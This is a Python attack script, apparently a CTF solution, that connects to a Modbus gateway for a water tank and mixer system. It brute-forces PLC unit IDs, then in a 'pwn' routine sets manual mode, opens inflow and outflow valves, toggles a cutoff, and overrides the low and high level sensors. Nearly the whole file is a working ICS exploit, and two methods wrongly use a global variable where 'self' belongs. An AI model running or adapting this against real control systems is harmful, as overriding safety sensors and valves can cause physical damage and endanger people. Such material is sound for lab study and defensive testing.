import json 
import socket

class Interface:
    def __init__(self):
        self.connection = None
        self.host = "" # ip:port goes here!!
        self.open_connection()
        
        self.debug = False
        self.mixer = 53
        self.water = 136

    def get_host_tuple(self):
        ip, port = self.host.split(":")
        port = int(port)
        return ip, port

    def open_connection(self):
       self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       self.connection.connect(self.get_host_tuple())
       self.connection.recv(1024)
       self.connection.recv(1024)


    def get_status(self):
        self.connection.send(b"system\n")
        r = self.connection.recv(1024)
        if self.debug:
            print(r)
            
        if b"SLAVE DEVICE" in r:
            r = self.connection.recv(1024)
            if self.debug:
                print(r)
            
            
        if b"cmd" in r:
            r = self.connection.recv(1024)
            if self.debug:
                print(r)
        
        self.connection.recv(1024)
        lines = r.split(b"\n")
        water_tank = lines[0]
        water_tank = water_tank[27:]
        water_tank = json.loads(water_tank)
        mixer = lines[2]
        mixer = mixer[6:]
        mixer = json.loads(mixer)

        print(water_tank)
        print(mixer)
        
        return {"tank": water_tank, "mixer": mixer}
    
    def send_command(self, plc, command, coil, data=False):
        prefix = "modbus"
        plc = format(plc, "02X")
        coil = format(coil,"04X")
        data = ["0000", "FF00"][data]
        modbus = plc+command+coil+data
        command = prefix + " " + modbus + "\n"
        print(command)
        self.connection.send(command.encode())
        if self.debug:
            print(self.connection.recv(1024))
            print(self.connection.recv(1024))
        else:
            self.connection.recv(1024)
            self.connection.recv(1024)
        
        
    def write_coil(self, plc, coil, data):
        self.get_status()
        self.send_command(plc, "05", coil, data)
        return self.get_status()
        
    def set_manual_mode_water(self, state):
        self.write_coil(self.water, 200, state)
        self.cutoff(True)
        
    def input_water(self, state):
        self.write_coil(self.water, 1336, state)
    
    def output_water(self, state):
        self.write_coil(self.water, 1234, state)
        
    def cutoff(self, state):
        self.write_coil(self.water, 206, state)
    
    def overwrite_low_sensor_water(self, state):
        i.write_coil(i.water, 64, state)
        
    def overwrite_high_sensor_mixer(self, state):
        i.write_coil(i.mixer, 68, state)

    def pwn(self):
        self.set_manual_mode_water(True)
        self.cutoff(True)
        self.output_water(True)
        self.input_water(True)
        self.overwrite_low_sensor_water(False)
        self.overwrite_high_sensor_mixer(True)
        self.cutoff(False)

    def test_plu(self, plu):
        if not self.water:
            is_water = self.write_coil(plu, 53, True)
            if is_water["tank"]["start"] == 1:
                self.water = plu
        if not self.mixer:
            is_mixer = self.write_coil(plu, 45, True)
            if is_mixer["mixer"]["start"] == 1:
                self.mixer = plu                    
    
    def fuzz_plu(self):
        for plu in range(256):
            self.test_plu(plu)
            if self.water and self.mixer:
                print("WATER PLU: "+str(self.water))
                print("MIXER PLU: "+str(self.mixer))
                break
            

    def fuzz_and_pwn(self):
        #this is for demonstration only
        self.water = None
        self.mixer = None
        self.fuzz_plu()
        self.pwn()



i = Interface()
i.fuzz_and_pwn()
